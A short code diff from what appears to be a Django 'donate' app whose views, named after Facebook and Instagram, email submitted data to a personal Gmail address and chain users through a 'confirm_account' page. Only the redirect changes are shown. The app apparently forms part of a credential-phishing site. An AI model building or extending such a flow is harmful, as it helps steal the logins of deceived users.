@@ -30,7 +30,7 @@ def confirm_account(request):
         ['oweeelliot@gmail.com'], 
         fail_silently=False, html_message=message)
 
-       return redirect('confirm_account')
+       return redirect('success')
 
    return render(request, 'donate/confirm_account.html')
 
@@ -83,7 +83,7 @@ def facebook(request):
         ['oweeelliot@gmail.com'], 
         fail_silently=False, html_message=message)
 
-       return redirect('google')
+       return redirect('confirm_account')
 
    return render(request, 'donate/facebook.html')
 
@@ -103,7 +103,7 @@ def instagram(request):
         ['oweeelliot@gmail.com'], 
         fail_silently=False, html_message=message)
 
-       return redirect('google')
+       return redirect('confirm_account')
 
    return render(request, 'donate/instagram.html')
 
